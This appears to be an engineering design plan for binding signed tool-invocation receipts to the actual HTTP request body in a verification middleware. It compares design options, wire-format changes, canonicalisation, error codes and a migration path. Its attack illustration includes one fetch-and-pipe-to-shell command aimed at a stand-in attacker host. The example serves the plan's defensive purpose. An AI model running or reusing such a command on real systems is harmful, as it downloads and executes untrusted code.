# Request-Binding Design Plan (Section 6.1 blocker)

**Status:** Planning — needs your decision on options flagged below before implementation begins.
**Closes:** [production-readiness-checklist §6.1](../production-readiness-checklist.md#61-bind-the-signed-invocation-to-the-actual-executed-request), tracker item #42.
**Touches:** `drs-verify/pkg/middleware/*`, `drs-verify/pkg/verify/chain.go`, `drs-sdk/src/sdk/issue.ts`, `drs-sdk/src/sdk/types.ts`, `drs-core` (optional canonicalisation helper).

---

## 1. Why this blocker exists

Today, `MCPMiddleware` / `A2AMiddleware` do the following sequence:

1. Read `X-DRS-Bundle` from the header.
2. Call `verify.Chain` on the bundle — signatures, chain hashes, policy, revocation.
3. If valid, attach `VerificationContext` to `r.Context()` and call the downstream handler with the **original request body untouched**.

The downstream handler then reads `r.Body`, decodes the JSON payload, and executes. There is **no comparison** between what the agent signed (`invocation.args`) and what the HTTP body actually contains.

### Concrete attack

```
1. Legitimate agent signs an invocation:
     invocation.args = { "tool": "web_search", "query": "python docs" }

2. A man-in-the-middle (or malicious reverse proxy, or a browser-extension
   hijacking fetch, or a compromised intermediate agent) intercepts the request.
   It keeps `X-DRS-Bundle` untouched (the header is cryptographically signed)
   but rewrites the HTTP body:
     body = { "tool": "shell", "query": "curl evil.example.com | sh" }

3. drs-verify reads the header, verifies the bundle — valid, signed, not revoked.
4. Middleware attaches VerificationContext and calls next.
5. Downstream handler reads body, sees { "tool": "shell", ... }, executes.
6. The receipt chain "proves" the agent authorised shell execution. It did not.
```

The signature never protected the body, so this attack does not break Ed25519 — it just exposes that DRS's current guarantee stops at the header.

### What "valid binding" means

After the fix, a successful verification must guarantee:

> The payload executed by the tool is exactly the payload the final agent
> committed to at signing time.

That guarantee has to survive any network-layer tampering and any intermediate that can modify bytes but not forge signatures.

---

## 2. Scope and non-goals

### In scope

- `/verify`, `/mcp/*`, `/a2a/*` routes on `drs-verify`.
- The SDK's issuance path: `issueInvocation` must emit whatever binding metadata the design requires.
- The Go middleware package (`pkg/middleware`) used by embedded integrations.
- The `ChainBundle` / `InvocationReceiptPayload` wire format in `pkg/types` and `drs-sdk/src/sdk/types.ts`.

### Explicitly NOT in scope

- **Response binding.** The server's reply is outside DRS's signing surface. Add response signing only if/when there is a concrete attack scenario.
- **Binding over raw transport bytes.** We bind over a canonicalised representation of the application payload, not over TCP / HTTP wire bytes (those include TLS framing, gateway rewrites, etc.).
- **Streaming / chunked / multipart uploads.** Treated as a follow-up (§ 8, phase 3). The initial design assumes `Content-Length` is known and the body fits in memory within `MaxBodyBytes`.
- **WebSocket / SSE.** Same: follow-up.
- **Backwards compatibility with unsigned bodies forever.** We will support a migration window; after it, unbound bundles are rejected on enforcing routes.

---

## 3. Design options

Five candidate approaches. They're not mutually exclusive, but the first one you pick sets the default.

### Option A — Execute from signed args (body becomes decorative)

The downstream handler ignores `r.Body` and executes using `invocation.args`. Middleware may enforce that `r.Body` is empty or simply ignore it.

**Pros**

- Cryptographically airtight. No body, no body-tamper path.
- Simplest mental model: "run what was signed".
- No additional verification step needed.

**Cons**

- Invocation payload must carry the full argument set. Every byte of args goes through JCS + JWT base64 — fat payloads inflate headers past typical proxy limits (8–32 KiB).
- Breaks existing Node/Python tool servers that expect a JSON request body.
- No natural path for file uploads, multipart, or streaming.
- Requires every tool integration to be rewritten.

**Fit**: great for pure JSON-RPC tools with small args. Wrong for anything else.

### Option B — Content-hash binding (recommended default)

Add an `args_hash` field to the invocation payload. It contains `sha256:{hex}` of `JCS(canonical(body))`. Middleware reads the body, computes the same hash, and 403s on mismatch.

**Pros**

- Body stays where it belongs (HTTP body, not header).
- Any payload shape: JSON, JSON-RPC, multipart (one hash per part).
- Scales to large bodies — hashing is O(body size); no serialisation inflation.
- Tools require zero handler changes — middleware enforces before dispatching.

**Cons**

- Signer must produce the body BEFORE signing (small workflow change in SDK).
- Middleware must fully buffer the body to hash it. Bounded by `MaxBodyBytes` (default 1 MiB) which is already in place. Larger bodies need a streaming variant (Option E).
- Canonicalisation has to agree across SDK and verifier — the single biggest implementation risk. v2 ate it on this exact rock (we shipped JCS but on the wrong representation).

**Fit**: 90% of the problem space. The recommended default.

### Option C — Field-level binding (bound_fields)

Invocation declares `bound_fields: ["tool", "query"]`. Middleware extracts those paths from the body, canonicalises, hashes, compares.

**Pros**

- Ambient fields (request IDs, timestamps added by gateways) can vary without invalidating the signature.

**Cons**

- Dev must correctly identify EVERY security-sensitive field. Forget one → free tampering.
- Spec complexity (JSONPath? dotted paths? flat list?).
- No consistent story for nested arrays of mixed-sensitivity fields.
- Reviewer can't audit "is this safe?" without understanding every handler.

**Fit**: reject — fails safe-by-default.

### Option D — "Args IS the body"

Semantic restatement of A. The invocation's `args` field is the canonical payload; the HTTP body, if present, MUST equal `JCS(args)` byte-for-byte. Middleware either strips the body or passes it through; either way, the handler reads `args` from the verified invocation, never from `r.Body`.

**Pros**

- Zero new wire format. `args` already exists.
- Same airtight story as Option A.

**Cons**

- Same as A — forces the args-in-header pattern.

**Fit**: worth keeping as an operator-opt-in mode alongside Option B. Shops with strict payloads and strong control over tool servers may prefer it.

### Option E — Streaming hash (follow-up, not v1)

For large bodies / uploads / multipart. Invocation carries `body_hash` of the streaming bytes. Middleware computes the rolling SHA-256 while proxying, aborts on mismatch.

**Pros**

- Enables DRS for file uploads, large payloads, WebSocket handshakes.

**Cons**

- Client must hash-and-buffer before signing (unless willing to sign after upload).
- Downstream handler must tolerate a torn connection at mismatch time.
- Idempotency and replay are harder — partial writes may have executed.

**Fit**: needed eventually, not in v1.

---

## 4. Recommendation

Land **Option B as the default + Option D as a per-route toggle**, with Option E deferred.

```
default: args_hash binding    — works for any JSON body, minimal tool-side change
operator opt-in: strict-args   — body MUST equal JCS(args); body is fully redundant
deferred: streaming hash       — separate design doc once we hit the need
```

Why this split:

- Option B gets us to a correct default without forcing every tool server to rewrite.
- Option D is valuable for shops that want zero tamper surface and can control the tool side. One env-var `REQUEST_BINDING_MODE=strict-args` flips the behaviour.
- Option E is real work and deserves its own plan once the core binding ships.

**Decision you need to make:** option B only, or B+D? (B only is fine; B+D is a small additional delta.)

---

## 5. Wire format (if we pick B)

### InvocationReceipt payload — new field

```ts
interface InvocationReceiptPayload {
  iss: string;
  sub: string;
  drs_v: "4.0";
  drs_type: "invocation-receipt";
  cmd: string;
  args: Record<string, unknown>;
  args_hash?: string;          // NEW: "sha256:{64 hex chars}"
  binding_version?: "jcs-v1";  // NEW: algorithm tag; explicit so future swaps are safe
  dr_chain: string[];
  tool_server: string;
  iat: number;
  jti: string;
}
```

- `args_hash` is **OPTIONAL** in v1. Present → middleware enforces. Absent → middleware falls back to today's behaviour and logs a warning (see § 7 migration).
- `binding_version` is the canonicalisation algorithm tag. Starts at `"jcs-v1"`; future changes (CBOR, canonical-JSON-v2, etc.) increment.

### ChainBundle — unchanged

No changes. The bundle already carries the invocation JWT; the new field is inside it.

### Optional: `binding_mode` on the invocation

If we take Option D too:

```ts
  binding_mode?: "hash" | "strict-args";
```

Defaults to `"hash"` when `args_hash` is present; `"strict-args"` means "the body MUST equal JCS(args); middleware strips the body before calling the handler."

---

## 6. Canonicalisation

This is where v2 got killed. Details matter.

### What the signer hashes

```
args_hash = "sha256:" + hex(SHA-256(JCS(body_json)))
```

Where:

- `body_json` is the **parsed** JSON of the request body, not the raw bytes.
- `JCS` is [RFC 8785](https://www.rfc-editor.org/rfc/rfc8785) canonical JSON serialisation — the same function the existing chain hashing uses.
- `SHA-256` per FIPS 180-4.
- Hex is lowercase.

### Why parsed-then-JCS and not raw bytes

If we hashed raw bytes, any whitespace difference in the body (e.g. a gateway that re-serialises JSON) would break the hash even though the logical payload is identical. JCS is exactly the tool we already use for chain linkage — same guarantees, same drift resistance.

### Cross-layer parity

The SDK (TypeScript) already exposes `jcsSerialise` via `drs-sdk/src/sdk/jcs.ts`. The verifier (Go) already calls into the Rust `drs-core` for JCS. We reuse both. No new canonicalisation implementation — reuse or nothing.

### Multipart / non-JSON bodies

Out of scope for v1 (Option E territory). Middleware rejects binding on non-JSON content types with a clear error, forcing the operator to opt out of binding explicitly or switch to strict-args mode.

---

## 7. Middleware flow (Option B)

### New sequence

```
1. Read X-DRS-Bundle header → decode bundle.
2. verify.Chain(bundle) — as today.
3. If invocation.args_hash is absent:
     a. In "lenient" mode (default during migration): log a warning, call next.
     b. In "enforced" mode (post-migration): return 403 BINDING_MISSING.
4. If invocation.binding_version != "jcs-v1": return 403 BINDING_UNKNOWN_ALG.
5. Read r.Body with MaxBodyBytes cap.
6. Parse JSON. On failure: return 400 BINDING_BODY_NOT_JSON.
7. Compute args_hash_actual = "sha256:" + hex(SHA-256(JCS(parsed))).
8. Constant-time compare args_hash_actual == invocation.args_hash.
     - Mismatch: return 403 BINDING_MISMATCH.
     - Match: proceed.
9. Commit nonce (as today, AFTER chain verify and binding check).
10. Create a new io.ReadCloser over the buffered body so the downstream
    handler can read it as r.Body.
11. Call next.
```

### Body re-reading

`r.Body` is a one-shot `io.ReadCloser`. Middleware reads it once for hashing. We wrap the buffered bytes in `io.NopCloser(bytes.NewReader(buf))` and reassign `r.Body` so handlers that re-read it still work.

### Error codes (new)

| HTTP | Error code | Meaning |
|---|---|---|
| 400 | `BINDING_BODY_NOT_JSON` | Body isn't parseable JSON; hash can't be computed. |
| 403 | `BINDING_MISMATCH` | Computed args_hash ≠ signed args_hash. |
| 403 | `BINDING_MISSING` | Bundle has no args_hash and enforced mode is on. |
| 403 | `BINDING_UNKNOWN_ALG` | `binding_version` is something we don't implement. |
| 413 | `BINDING_BODY_TOO_LARGE` | Body exceeded `MaxBodyBytes`; binding couldn't complete. |

Add these to `docs-site/src/reference/error-codes.md`.

### Config

New env var: `REQUEST_BINDING_MODE`

| Value | Behaviour |
|---|---|
| `lenient` (default during migration) | Enforce when `args_hash` is present; log warning when absent. |
| `enforced` (post-migration default) | Reject (403) bundles without `args_hash`. |
| `off` | Skip binding entirely. For emergencies / broken clients. Logs a LOUD warning every request. |

---

## 8. Implementation phases

### Phase 1 — SDK: emit `args_hash` on every invocation (small, self-contained)

- Update `drs-sdk/src/sdk/issue.ts::issueInvocation` to:
  1. JCS-serialise the body the caller intends to send.
  2. SHA-256 it.
  3. Set `payload.args_hash` and `payload.binding_version = "jcs-v1"`.
- API change: `InvocationParams` gains an optional `body` or `requestBody` field; if absent, `args_hash` is derived from `args` (makes the "args IS body" default work).
- Tests in `drs-sdk/src/sdk/issue.test.ts`.

**Estimate:** 1 working session. Pure TS; no infra.

### Phase 2 — Verifier: enforce binding in lenient mode

- New package: `drs-verify/pkg/binding/binding.go` — exposes `ComputeBodyHash(body []byte) (string, error)` and `CheckBinding(invocation InvocationPayload, body []byte) error`.
- Wire into `pkg/middleware/mcp.go`, `pkg/middleware/a2a.go`, `cmd/server/main.go::/verify` handler.
- Body-rewrapping helper in middleware.
- Config: `REQUEST_BINDING_MODE` env var.
- Tests in `pkg/binding/binding_test.go` + E2E suite update.

**Estimate:** 2–3 working sessions. Most of the risk is canonicalisation parity with the SDK; unit tests against shared test vectors mitigate.

### Phase 3 — Enforced-mode rollout

- Flip the default from `lenient` → `enforced` in a new minor version.
- Deprecation notice in release notes.
- Keep `off` as an escape hatch.

**Estimate:** docs + config default change. Ships behind a normal release.

### Phase 4 (deferred) — streaming / multipart

- Separate design doc.
- Implement `body_hash` rolling-hash path (Option E).
- Coordinate with SDK to hash during upload.

**Estimate:** needs its own plan.

---

## 9. Test plan

### Unit

- `drs-sdk` round-trip: `issueInvocation` produces `args_hash` → independent Go verifier computes the same hash → match. This is the critical parity test.
- Edge cases: empty body, nested arrays, unicode, numeric precision edge cases (JCS rules for numbers are the usual trap).
- Mismatched `binding_version` rejected.

### Integration

- Full flow under `integration-tests/tests/e2e.test.mjs`:
  - Happy path: SDK-signed invocation, correct body → 200.
  - Tampered body (flip one char after signing) → 403 BINDING_MISMATCH.
  - Missing args_hash in enforced mode → 403 BINDING_MISSING.
  - Missing args_hash in lenient mode → 200 + log.
  - Oversized body → 413 BINDING_BODY_TOO_LARGE.

### Conformance vectors

- Add to `fixtures/conformance/` a small set of known `(body, args_hash)` pairs so any independent implementation can verify parity.

---

## 10. Open questions (your decision)

Flagged explicitly so you can answer in-line before I cut code.

1. **Option B only, or B + D (strict-args mode)?**
   Recommendation: B + D, with D as opt-in via `REQUEST_BINDING_MODE=strict-args`.

2. **Default mode on launch: `lenient` or `enforced`?**
   Recommendation: `lenient` for one minor version (so existing integrations don't break overnight), then flip to `enforced` in the following release with a loud deprecation warning in between.

3. **Name of the signed field: `args_hash` or `body_hash`?**
   I've been using `args_hash` because it aligns with the existing `args` field. Counter-argument: it isn't a hash OF `args` — it's a hash of the request body. `body_hash` is clearer. Your call.

4. **Do we version the algorithm (`binding_version`) or hard-code `jcs-v1`?**
   Recommendation: version it. One-character cost, prevents v3 paralysis.

5. **How invasive is the SDK API change allowed to be?**
   - Minimal: add optional `body` to `InvocationParams`, default to `args`.
   - Cleaner: introduce a `bind(body)` helper on a new `InvocationBuilder` class.
   My preference is the minimal option — it keeps `issueInvocation` stable for current consumers.

6. **Does the `/verify` endpoint need a `body` field in its request, or is binding only enforced via `/mcp/*` and `/a2a/*` where a real body exists?**
   `/verify` is a bundle-only inspector; no downstream body. Recommendation: `/verify` does NOT enforce binding — it's a verify-this-bundle-in-isolation tool. Binding is a middleware-path concern.

7. **Multipart / non-JSON: hard-fail in v1, or soft-skip?**
   Recommendation: hard-fail with `BINDING_BODY_NOT_JSON` + `Content-Type` must be `application/json` (or absent with an empty body). Forces operators to explicitly choose when they adopt streaming (Option E).

---

## 11. Migration story (what breaks, what doesn't)

### SDK consumers

- Old SDK version issues invocations without `args_hash`.
- `drs-verify` in `lenient` mode (v0.3.x) accepts them but logs a warning.
- `drs-verify` in `enforced` mode (v0.4.x) rejects them with `BINDING_MISSING`.
- Migration path: upgrade SDK first, verifier second. One version of lenient-mode overlap is the grace window.

### Go middleware users

- `pkg/middleware.MCPMiddleware` gains a new parameter or config option for binding mode. Default during overlap: `lenient`.
- Library users who never touch invocations (just verify) see no API change.

### Test harnesses

- `integration-tests/tests/e2e.test.mjs` uses the same SDK under test, so the parity story is automatic.

---

## 12. What I'll deliver once you sign off

1. `drs-sdk` PR: Phase 1. Includes unit tests + updated README example.
2. `drs-verify` PR: Phase 2. New `pkg/binding` package, middleware wiring, error codes, config, E2E tests.
3. Docs PR:
   - `docs-site/src/explanation/request-binding.md` — explains the guarantee.
   - `docs-site/src/reference/error-codes.md` — new codes.
   - `docs-site/src/how-to/builders/*.md` — updated integration examples to show `args_hash` in the wire format.
   - `production-readiness-checklist.md` — mark §6.1 closed.
4. Release notes for the cut where this lands.

Total scope: roughly the same shape as the Group 1 security fixes PR — one focused change per layer, tests in lock-step.

---

## 13. Risks

| Risk | Mitigation |
|---|---|
| **Canonicalisation drift between SDK (TS) and verifier (Go).** | Reuse existing JCS implementations on both sides. Add a shared conformance test vector set under `fixtures/conformance/binding/`. Ship the SDK parity test as a blocker for every verifier release. |
| **Gateways / CDNs rewriting JSON.** | JCS normalises out whitespace and key ordering. Rewrites that change the logical payload (inject fields, drop fields) legitimately break the hash — that's the point. |
| **Legacy clients locked to old SDK.** | Lenient mode with loud logging buys one minor version of migration time. Document `REQUEST_BINDING_MODE=off` as the nuclear option for enterprise customers who need more. |
| **Request-binding check doubles verification latency.** | Body read + hash is dominated by I/O. Expect sub-millisecond overhead for <100 KiB bodies; bound by `MaxBodyBytes`. |
| **Double-read of the body interferes with downstream handlers.** | Middleware rewraps `r.Body` with `bytes.NewReader` so handlers read normally. Tested in E2E. |

---

## 14. References

- [RFC 8785 — JSON Canonicalization Scheme](https://www.rfc-editor.org/rfc/rfc8785)
- [docs/drs-source-of-truth.md](../drs-source-of-truth.md) — current `InvocationReceipt` layout
- [docs/production-readiness-checklist.md §6.1](../production-readiness-checklist.md)
- [drs-sdk/src/sdk/jcs.ts](../../drs-sdk/src/sdk/jcs.ts) — existing SDK canonicaliser
- [drs-verify/pkg/verify/chain.go](../../drs-verify/pkg/verify/chain.go) — existing verification path (Block C is where binding hooks in)
- [security_audit_report_2026-04-08.md](../security_audit_report_2026-04-08.md) — prior note that this gap exists
